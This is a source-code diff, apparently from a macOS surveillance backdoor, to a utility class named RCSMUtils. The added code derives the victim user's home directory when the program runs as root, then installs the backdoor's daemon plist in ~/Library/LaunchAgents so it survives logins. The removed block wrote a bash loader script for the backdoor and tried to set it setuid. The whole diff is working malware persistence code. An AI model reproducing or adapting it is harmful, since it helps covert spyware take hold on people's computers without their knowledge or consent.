@@ -323,12 +323,45 @@ static RCSMUtils *sharedUtils = nil;
 {
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
   NSDictionary *innerDict;
+  NSString *userHome;
   
+  if (getuid() == 0)
+    {
+      //
+      // if we've been correctly executed from /Users/<user>/Library/Preferences
+      // we can safely obtain the user home from our current path
+      // if not just use NSHomeDirectory()
+      //
+      if ([[[NSBundle mainBundle] bundlePath]
+          rangeOfString: @"/Library/Preferences"].location != NSNotFound
+          && [[[NSBundle mainBundle] bundlePath]
+          rangeOfString: @"/Users/"].location != NSNotFound)
+        {
+          userHome = [NSString stringWithString:
+            [[[[[NSBundle mainBundle] bundlePath]
+            stringByDeletingLastPathComponent]
+            stringByDeletingLastPathComponent]
+            stringByDeletingLastPathComponent]];
+        }
+      else
+        {
+#ifdef DEBUG_UTILS
+          errorLog(@"Error, run the backdoor from the correct path");
+#endif
+
+          return NO;
+        }
+    }
+  else
+    {
+      userHome = NSHomeDirectory(); 
+    }
+
   NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
-                        NSHomeDirectory(),
+                        userHome,
                         BACKDOOR_DAEMON_PLIST];
   NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
-           NSHomeDirectory()];
+           userHome];
 
   if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
     {
@@ -365,30 +398,7 @@ static RCSMUtils *sharedUtils = nil;
   return [self saveSLIPlist: rootObj
                      atPath: ourPlist];
 }
-#if 0
-- (BOOL)createBackdoorLoader
-{
-  NSString *myData = [NSString stringWithFormat:
-                      @"#!/bin/bash\n cd %@\n %@ &\n",
-                      [[NSBundle mainBundle] bundlePath],
-                      [[NSBundle mainBundle] executablePath]];
-                      //@"#!/bin/bash\n %@\n", mBackdoorPath];
-  
-  BOOL success = [myData writeToFile: mServiceLoaderPath
-                          atomically: NO
-                            encoding: NSASCIIStringEncoding
-                               error: nil];
-  
-  if ([self makeSuidBinary: mServiceLoaderPath] == NO)
-    {
-#ifdef DEBUG_UTILS
-      NSLog(@"[makeSuidBinary] %@ - not enough privileges", mServiceLoaderPath);
-#endif
-    }
-  
-  return success;
-}
-#endif
+
 - (BOOL)isBackdoorPresentInSLI: (NSString *)aKey
 {
   return [self searchSLIPlistForKey: aKey];
